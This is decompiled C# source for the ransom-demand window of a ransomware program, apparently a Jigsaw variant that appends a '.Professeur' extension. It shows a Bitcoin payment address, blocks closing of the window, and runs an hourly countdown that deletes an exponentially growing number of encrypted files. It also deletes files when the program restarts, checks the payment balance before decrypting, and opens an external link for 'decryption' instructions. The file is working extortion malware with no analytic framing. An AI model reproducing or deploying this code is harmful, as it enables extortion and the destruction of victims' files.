using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using ns0;

namespace Main;

public class FormGame : Form
{
	private static int int_0;

	private static int int_1;

	private static double double_0;

	private static int int_2;

	private IContainer icontainer_0;

	private Label labelWelcome;

	private Timer timer_0;

	private Label labelTask;

	private TextBox textBoxAddress;

	private Button buttonCheckPayment;

	private Button buttonViewEncryptedFiles;

	private Timer timer_1;

	private Label labelCountDown;

	private Label labelFilesToDelete;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	public FormGame()
	{
		InitializeComponent();
	}

	private void FormGame_Load(object sender, EventArgs e)
	{
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		Class11.smethod_4((Form)(object)this);
		timer_0.set_Interval(125);
		timer_0.set_Enabled(true);
		((Control)labelWelcome).set_Text("");
		((Control)labelTask).set_Text(Class2.string_14);
		((Control)labelTask).set_Visible(false);
		((TextBoxBase)textBoxAddress).set_ReadOnly(true);
		((Control)textBoxAddress).set_Text(smethod_2());
		((Control)textBoxAddress).set_Visible(false);
		((Control)buttonCheckPayment).set_Visible(false);
		((Control)buttonViewEncryptedFiles).set_Visible(false);
		((Control)labelCountDown).set_Visible(false);
		timer_1.set_Enabled(false);
		((Control)labelFilesToDelete).set_Visible(false);
		if (smethod_0())
		{
			smethod_1(5);
		}
	}

	private static bool smethod_0()
	{
		string path = Path.Combine(Class2.string_12, "dr");
		if (File.Exists(path))
		{
			return true;
		}
		File.WriteAllText(path, "21");
		return false;
	}

	private static void smethod_1(int int_3)
	{
		try
		{
			int num = 0;
			foreach (string item in Class8.smethod_1())
			{
				if (num == int_3)
				{
					break;
				}
				File.Delete(item + ".Professeur");
				num++;
			}
		}
		catch (Exception)
		{
		}
	}

	private static string smethod_2()
	{
		string path = Path.Combine(Class2.string_12, "Address.txt");
		if (File.Exists(path))
		{
			return File.ReadAllText(path);
		}
		HashSet<string> hashSet = new HashSet<string>();
		foreach (string item in Class4.vanityAddresses.Split(new string[1] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries).ToList())
		{
			hashSet.Add(item.Trim());
		}
		string text = hashSet.OrderBy((string string_0) => Guid.NewGuid()).FirstOrDefault();
		File.WriteAllText(path, text);
		return text;
	}

	private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		((CancelEventArgs)(object)e).Cancel = true;
		MessageBox.Show((IWin32Window)(object)this, "You are about to make a very bad decision. Are you sure about it?");
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		string string_ = Class2.string_13;
		((Control)labelWelcome).set_Text(string_.Substring(0, int_2) + "_");
		int_2++;
		if (int_2 == string_.Length + 1)
		{
			timer_0.set_Enabled(false);
			((Control)labelTask).set_Visible(true);
			((Control)textBoxAddress).set_Visible(true);
			((Control)buttonCheckPayment).set_Visible(true);
			((Control)buttonViewEncryptedFiles).set_Visible(true);
			((Control)labelCountDown).set_Visible(true);
			timer_1.set_Enabled(true);
			((Control)labelFilesToDelete).set_Visible(true);
			int_0 = 3600;
		}
	}

	private void buttonCheckPayment_Click(object sender, EventArgs e)
	{
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		Process.Start("https://www.mediafire.com/file/frij6ecitdnnmev/Decrypte-Files.pdf/file");
		try
		{
			double num = Class5.smethod_0();
			int num2 = (int)(Class5.smethod_1(smethod_2()) * num);
			if (num2 > Class2.int_2)
			{
				timer_1.Stop();
				((Control)buttonCheckPayment).set_Enabled(false);
				((Control)buttonCheckPayment).set_BackColor(Color.Lime);
				((Control)buttonCheckPayment).set_Text("Great job, I'm decrypting your files...");
				MessageBox.Show((IWin32Window)(object)this, "Decrypting your files. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
				Class8.smethod_6(".Professeur");
				Class6.smethod_3();
			}
			else if (num2 > 0)
			{
				((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
				((Control)buttonCheckPayment).set_Text("You did not sent me enough! Try again!");
			}
			else
			{
				((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
				((Control)buttonCheckPayment).set_Text("You haven't made payment yet! Try again!");
			}
		}
		catch
		{
			((Control)buttonCheckPayment).set_Text("Are you connected to the internet? Try again!");
			((Control)buttonCheckPayment).set_BackColor(Color.Tomato);
		}
	}

	private void buttonViewEncryptedFiles_Click(object sender, EventArgs e)
	{
		((Form)new FormEncryptedFiles()).Show((IWin32Window)(object)this);
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		if (int_0 > 0)
		{
			int_0--;
			int num = int_0 / 60;
			int num2 = int_0 % 60;
			((Control)labelCountDown).set_Text(num + ":" + num2);
		}
		else
		{
			int_0 = 3600;
			int num3 = (int)Math.Pow(1.1, int_1);
			((Control)labelFilesToDelete).set_Text(num3 + " files will be deleted");
			int_1++;
			smethod_1(num3);
		}
	}

	private void textBoxAddress_TextChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Expected O, but got Unknown
		//IL_03c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d1: Expected O, but got Unknown
		//IL_0468: Unknown result type (might be due to invalid IL or missing references)
		//IL_0472: Expected O, but got Unknown
		//IL_05a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ac: Expected O, but got Unknown
		icontainer_0 = new Container();
		labelWelcome = new Label();
		timer_0 = new Timer(icontainer_0);
		labelTask = new Label();
		textBoxAddress = new TextBox();
		buttonCheckPayment = new Button();
		buttonViewEncryptedFiles = new Button();
		timer_1 = new Timer(icontainer_0);
		labelCountDown = new Label();
		labelFilesToDelete = new Label();
		((Control)this).SuspendLayout();
		((Control)labelWelcome).set_AutoSize(true);
		((Control)labelWelcome).set_BackColor(Color.Black);
		((Control)labelWelcome).set_Font(new Font("Lucida Console", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)labelWelcome).set_ForeColor(Color.Lime);
		((Control)labelWelcome).set_Location(new Point(25, 29));
		((Control)labelWelcome).set_Name("labelWelcome");
		((Control)labelWelcome).set_Size(new Size(318, 16));
		((Control)labelWelcome).set_TabIndex(0);
		((Control)labelWelcome).set_Text("All Your Files Has Been Locked!");
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((Control)labelTask).set_AutoSize(true);
		((Control)labelTask).set_BackColor(Color.Black);
		((Control)labelTask).set_Font(new Font("Lucida Console", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelTask).set_ForeColor(Color.Lime);
		((Control)labelTask).set_Location(new Point(25, 505));
		((Control)labelTask).set_Name("labelTask");
		((Control)labelTask).set_Size(new Size(239, 16));
		((Control)labelTask).set_TabIndex(1);
		((Control)labelTask).set_Text("All you have to do...");
		((Control)textBoxAddress).set_Location(new Point(28, 524));
		((Control)textBoxAddress).set_Name("textBoxAddress");
		((Control)textBoxAddress).set_Size(new Size(348, 20));
		((Control)textBoxAddress).set_TabIndex(2);
		((Control)textBoxAddress).set_Text("1C1pAkwpvuxr4ZxzqHSeTLpFGQMDMJKS3U");
		((Control)textBoxAddress).add_TextChanged((EventHandler)textBoxAddress_TextChanged);
		((Control)buttonCheckPayment).set_BackColor(Color.Gold);
		((Control)buttonCheckPayment).set_Location(new Point(28, 551));
		((Control)buttonCheckPayment).set_Name("buttonCheckPayment");
		((Control)buttonCheckPayment).set_Size(new Size(348, 33));
		((Control)buttonCheckPayment).set_TabIndex(3);
		((Control)buttonCheckPayment).set_Text("How To Decrypte Files !");
		((ButtonBase)buttonCheckPayment).set_UseVisualStyleBackColor(false);
		((Control)buttonCheckPayment).add_Click((EventHandler)buttonCheckPayment_Click);
		((Control)buttonViewEncryptedFiles).set_BackColor(Color.Gray);
		((Control)buttonViewEncryptedFiles).set_Location(new Point(28, 479));
		((Control)buttonViewEncryptedFiles).set_Name("buttonViewEncryptedFiles");
		((Control)buttonViewEncryptedFiles).set_Size(new Size(348, 23));
		((Control)buttonViewEncryptedFiles).set_TabIndex(4);
		((Control)buttonViewEncryptedFiles).set_Text("View encrypted files");
		((ButtonBase)buttonViewEncryptedFiles).set_UseVisualStyleBackColor(false);
		((Control)buttonViewEncryptedFiles).add_Click((EventHandler)buttonViewEncryptedFiles_Click);
		timer_1.set_Interval(1000);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		((Control)labelCountDown).set_AutoSize(true);
		((Control)labelCountDown).set_BackColor(Color.Black);
		labelCountDown.set_BorderStyle((BorderStyle)2);
		((Control)labelCountDown).set_Font(new Font("Lucida Sans Unicode", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)labelCountDown).set_ForeColor(Color.DarkRed);
		((Control)labelCountDown).set_Location(new Point(28, 320));
		((Control)labelCountDown).set_Name("labelCountDown");
		((Control)labelCountDown).set_Size(new Size(220, 80));
		((Control)labelCountDown).set_TabIndex(5);
		((Control)labelCountDown).set_Text("59:59");
		((Control)labelFilesToDelete).set_AutoSize(true);
		((Control)labelFilesToDelete).set_BackColor(Color.Black);
		((Control)labelFilesToDelete).set_Font(new Font("Lucida Console", 12f, (FontStyle)1));
		((Control)labelFilesToDelete).set_ForeColor(Color.Lime);
		((Control)labelFilesToDelete).set_Location(new Point(24, 455));
		((Control)labelFilesToDelete).set_Name("labelFilesToDelete");
		((Control)labelFilesToDelete).set_Size(new Size(261, 16));
		((Control)labelFilesToDelete).set_TabIndex(6);
		((Control)labelFilesToDelete).set_Text("1 file will be deleted.");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Class4.Jigsaw);
		((Form)this).set_ClientSize(new Size(840, 596));
		((Control)this).get_Controls().Add((Control)(object)labelFilesToDelete);
		((Control)this).get_Controls().Add((Control)(object)labelCountDown);
		((Control)this).get_Controls().Add((Control)(object)buttonViewEncryptedFiles);
		((Control)this).get_Controls().Add((Control)(object)buttonCheckPayment);
		((Control)this).get_Controls().Add((Control)(object)textBoxAddress);
		((Control)this).get_Controls().Add((Control)(object)labelTask);
		((Control)this).get_Controls().Add((Control)(object)labelWelcome);
		((Control)this).set_Name("FormGame");
		((Form)this).add_FormClosing(new FormClosingEventHandler(FormGame_FormClosing));
		((Form)this).add_Load((EventHandler)FormGame_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
